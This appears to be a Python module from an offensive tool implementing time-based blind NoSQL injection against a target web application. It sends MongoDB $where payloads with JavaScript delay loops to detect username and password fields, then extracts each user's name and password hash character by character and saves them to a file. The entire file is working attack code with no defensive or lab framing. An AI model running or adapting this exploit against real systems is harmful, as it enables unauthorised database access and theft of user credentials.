import time
import string
import json
import sys
from utils.http_client import HttpClient
from colorama import Fore, Style

# Common field names used in different applications
COMMON_USERNAME_FIELDS = ['username', 'user', 'name', 'login', 'email', 'uname', 'user_name', 'userName']
COMMON_PASSWORD_FIELDS = ['password', 'passwordHash', 'password_hash', 'pass', 'pwd', 'passwd', 'hash', 'secret', 'passHash']

class NoSQLDumper:
    def __init__(self, target_url, extra_data, method='POST', custom_headers=None, pattern_type='busy-wait', verbose=False):
        self.http_client = HttpClient(target_url, method, custom_headers=custom_headers)
        self.extra_data = extra_data
        self.baseline_time = 2.0
        self.chars = string.digits + string.ascii_letters + "@._-!#$%^&*"
        self.pattern_type = pattern_type
        self.verbose = verbose
        self.target_mode = None
        self.extracted_values = set()
        self.detected_username_field = None
        self.detected_password_field = None
        print(f"[*] Dumper initialized with delay pattern: {pattern_type}")

    def measure_baseline(self, parameter):
        print("[*] Measuring baseline latency...")
        times = []
        benign_payload = {"$where": "true"}
        data = self.extra_data.copy()
        data[parameter] = json.dumps(benign_payload)
        
        for _ in range(3):
            start = time.time()
            try:
                self.http_client.send_request(data, timeout=10)
            except:
                pass
            times.append(time.time() - start)
        
        if times:
            self.baseline_time = sum(times) / len(times)
        print(f"[*] Baseline established: {self.baseline_time:.2f}s")
        return self.baseline_time
    
    def build_delay_code(self, condition, delay_ms=5000):
        if self.pattern_type == 'sleep':
            return f"if ({condition}) {{ sleep({delay_ms}); }}"
        elif self.pattern_type == 'busy-wait':
            return f"if ({condition}) {{ var t = new Date().getTime(); while((new Date().getTime()) - t < {delay_ms}) {{}} }}"
        elif self.pattern_type == 'computation':
            iterations = delay_ms * 10000
            return f"if ({condition}) {{ var x = 0; for(var i = 0; i < {iterations}; i++) {{ x += Math.sqrt(i); }} }}"
        else:
            return f"if ({condition}) {{ var t = new Date().getTime(); while((new Date().getTime()) - t < {delay_ms}) {{}} }}"

    def detect_fields(self, parameter):
        """Auto-detect username and password field names by testing common patterns."""
        print(f"\n{Fore.CYAN}[*] Auto-detecting field names...{Style.RESET_ALL}")
        threshold = self.baseline_time + 1.5
        
        # Detect username field
        for field in COMMON_USERNAME_FIELDS:
            payload = {"$where": f"if (this.{field}) {{ var t = new Date().getTime(); while((new Date().getTime()) - t < 2000) {{}} }}"}
            data = self.extra_data.copy()
            data[parameter] = json.dumps(payload)
            
            start = time.time()
            try:
                self.http_client.send_request(data, timeout=10)
            except:
                pass
            duration = time.time() - start
            
            if duration > threshold:
                print(f"{Fore.GREEN}[+] Detected username field: {field}{Style.RESET_ALL}")
                self.detected_username_field = field
                break
        
        if not self.detected_username_field:
            print(f"{Fore.YELLOW}[!] Could not auto-detect username field, using 'username'{Style.RESET_ALL}")
            self.detected_username_field = 'username'
        
        # Detect password field
        for field in COMMON_PASSWORD_FIELDS:
            payload = {"$where": f"if (this.{field}) {{ var t = new Date().getTime(); while((new Date().getTime()) - t < 2000) {{}} }}"}
            data = self.extra_data.copy()
            data[parameter] = json.dumps(payload)
            
            start = time.time()
            try:
                self.http_client.send_request(data, timeout=10)
            except:
                pass
            duration = time.time() - start
            
            if duration > threshold:
                print(f"{Fore.GREEN}[+] Detected password field: {field}{Style.RESET_ALL}")
                self.detected_password_field = field
                break
        
        if not self.detected_password_field:
            print(f"{Fore.YELLOW}[!] Could not auto-detect password field, using 'password'{Style.RESET_ALL}")
            self.detected_password_field = 'password'

    def verify_access(self, parameter):
        self.measure_baseline(parameter)
        print("\n[?] Verifying injection context...")
        
        threshold = self.baseline_time + 1.5
        
        # Test basic execution
        checks = [
            ("Execution Test", "var t = new Date().getTime(); while((new Date().getTime()) - t < 2000) {}"),
            ("Local Context (this)", "if (this) { var t = new Date().getTime(); while((new Date().getTime()) - t < 2000) {} }")
        ]
        
        can_execute = False
        can_dump_local = False
        
        for name, payload_code in checks:
            payload = {"$where": payload_code}
            data = self.extra_data.copy()
            data[parameter] = json.dumps(payload)
            
            sys.stdout.write(f"[*] Checking {name}... ")
            sys.stdout.flush()
            
            start = time.time()
            try:
                self.http_client.send_request(data, timeout=10)
            except:
                pass
            duration = time.time() - start
            
            if duration > threshold:
                print(f"{Fore.GREEN}SUCCESS ({duration:.2f}s){Style.RESET_ALL}")
                if "Execution" in name:
                    can_execute = True
                elif "Local Context" in name:
                    can_dump_local = True
            else:
                print(f"{Fore.RED}FAILED ({duration:.2f}s){Style.RESET_ALL}")
        
        if can_dump_local:
            # Auto-detect field names
            self.detect_fields(parameter)
            
            # Test if detected fields work
            print(f"\n[*] Testing field access (this.{self.detected_username_field})... ", end="")
            sys.stdout.flush()
            
            test_payload = {"$where": f"if (this.{self.detected_username_field}) {{ var t = new Date().getTime(); while((new Date().getTime()) - t < 2000) {{}} }}"}
            data = self.extra_data.copy()
            data[parameter] = json.dumps(test_payload)
            
            start = time.time()
            try:
                self.http_client.send_request(data, timeout=10)
            except:
                pass
            duration = time.time() - start
            
            if duration > threshold:
                print(f"{Fore.GREEN}SUCCESS ({duration:.2f}s){Style.RESET_ALL}")
                print(f"\n{Fore.GREEN}[+] Can access: this.{self.detected_username_field} and this.{self.detected_password_field}{Style.RESET_ALL}")
                self.target_mode = 'users_direct'
                return True
            else:
                print(f"{Fore.RED}FAILED ({duration:.2f}s){Style.RESET_ALL}")
                print(f"\n{Fore.YELLOW}[+] Local context accessible but field detection failed{Style.RESET_ALL}")
                self.target_mode = 'local'
                return True
        elif can_execute:
            print(f"\n{Fore.YELLOW}[+] Can execute but limited context{Style.RESET_ALL}")
            self.target_mode = 'execute_only'
            return True
        else:
            print(f"\n{Fore.RED}[!] Cannot execute injection{Style.RESET_ALL}")
            return False

    def dump_users(self, parameter):
        if not self.verify_access(parameter):
            return

        print(f"\n{Fore.CYAN}[+] Starting Database Dump...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Username field: {self.detected_username_field}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Password field: {self.detected_password_field}{Style.RESET_ALL}")
        
        extracted_usernames = set()
        output_file = "dumped_users.txt"
        
        try:
            with open(output_file, 'r') as f:
                for line in f:
                    if line.startswith("Username:"):
                        username = line.split("Username:")[1].strip()
                        extracted_usernames.add(username)
                        self.extracted_values.add(username)
            print(f"{Fore.CYAN}[*] Loaded {len(extracted_usernames)} previously extracted user(s){Style.RESET_ALL}")
        except FileNotFoundError:
            print(f"{Fore.CYAN}[*] Creating new output file: {output_file}{Style.RESET_ALL}")
        
        if self.target_mode == 'users_direct':
            print(f"\n{Fore.CYAN}[*] Enumerating users...{Style.RESET_ALL}")
            
            max_users = 20
            users_found = 0
            
            try:
                for user_idx in range(max_users):
                    print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}[*] User #{user_idx + 1}...{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
                    
                    print(f"\n{Fore.YELLOW}[*] Extracting {self.detected_username_field}...{Style.RESET_ALL}")
                    show_example = (user_idx == 0 and self.verbose)
                    username = self.extract_field(parameter, self.detected_username_field, max_len=50, show_payload_example=show_example)
                    
                    if not username:
                        print(f"\n{Fore.YELLOW}[!] No more users found.{Style.RESET_ALL}")
                        break
                    
                    print(f"\n{Fore.GREEN}[+] {self.detected_username_field}: {username}{Style.RESET_ALL}")
                    
                    print(f"\n{Fore.YELLOW}[*] Extracting {self.detected_password_field} for '{username}'...{Style.RESET_ALL}")
                    password_hash = self.extract_field(parameter, self.detected_password_field, max_len=64, username_filter=username)
                    print(f"\n{Fore.GREEN}[+] {self.detected_password_field}: {password_hash}{Style.RESET_ALL}")
                    
                    with open(output_file, 'a') as f:
                        f.write(f"\n{'='*60}\n")
                        f.write(f"Username: {username}\n")
                        f.write(f"Password: {password_hash}\n")
                        f.write(f"{'='*60}\n")
                    
                    extracted_usernames.add(username)
                    users_found += 1
                    print(f"{Fore.GREEN}[✓] Saved to {output_file}{Style.RESET_ALL}")
                
                print(f"\n{Fore.GREEN}[+] Complete! Found {users_found} user(s){Style.RESET_ALL}")
            
            except KeyboardInterrupt:
                print(f"\n\n{Fore.YELLOW}[!] Interrupted.{Style.RESET_ALL}")
                if users_found > 0:
                    print(f"{Fore.GREEN}[+] Saved {users_found} user(s){Style.RESET_ALL}")
                sys.exit(0)
        else:
            print(f"\n{Fore.YELLOW}[!] Cannot extract users - field access not available.{Style.RESET_ALL}")

    def extract_field(self, parameter, field_name, max_len=50, username_filter=None, show_payload_example=False):
        extracted_data = ""
        exclusion_list = list(self.extracted_values) if field_name == self.detected_username_field else []
        
        if show_payload_example:
            from urllib.parse import urlencode, quote_plus
            example_js = self.build_delay_code(f"this.{field_name} && this.{field_name}.substring(0, 1) == 'X'", 5000)
            example_payload = {"$where": example_js}
            example_data = self.extra_data.copy()
            example_data[parameter] = quote_plus(json.dumps(example_payload))
            print(f"\n{Fore.CYAN}[Payload] {urlencode(example_data, quote_via=quote_plus)}{Style.RESET_ALL}\n")
        
        while len(extracted_data) < max_len:
            char_found = False
            
            for char in self.chars:
                test_str = extracted_data + char
                test_len = len(test_str)
                safe_str = test_str.replace("\\", "\\\\").replace("'", "\\'")
                
                if username_filter:
                    safe_username = username_filter.replace("\\", "\\\\").replace("'", "\\'")
                    condition = f"this.{self.detected_username_field} == '{safe_username}' && this.{field_name} && this.{field_name}.substring(0, {test_len}) == '{safe_str}'"
                else:
                    condition = f"this.{field_name} && this.{field_name}.substring(0, {test_len}) == '{safe_str}'"
                    if exclusion_list:
                        exclusions = " && ".join([
                            f"this.{field_name} != '{u.replace(chr(92), chr(92)+chr(92)).replace(chr(39), chr(92)+chr(39))}'"
                            for u in exclusion_list
                        ])
                        condition = f"({exclusions}) && {condition}"
                
                js_code = self.build_delay_code(condition, delay_ms=5000)
                payload = {"$where": js_code}
                data = self.extra_data.copy()
                data[parameter] = json.dumps(payload)
                
                start = time.time()
                try:
                    self.http_client.send_request(data, timeout=10)
                except:
                    pass
                duration = time.time() - start
                
                if duration > 4.0:
                    extracted_data += char
                    sys.stdout.write(char)
                    sys.stdout.flush()
                    char_found = True
                    break
            
            if not char_found:
                break
        
        if field_name == self.detected_username_field and extracted_data:
            self.extracted_values.add(extracted_data)
        
        return extracted_data
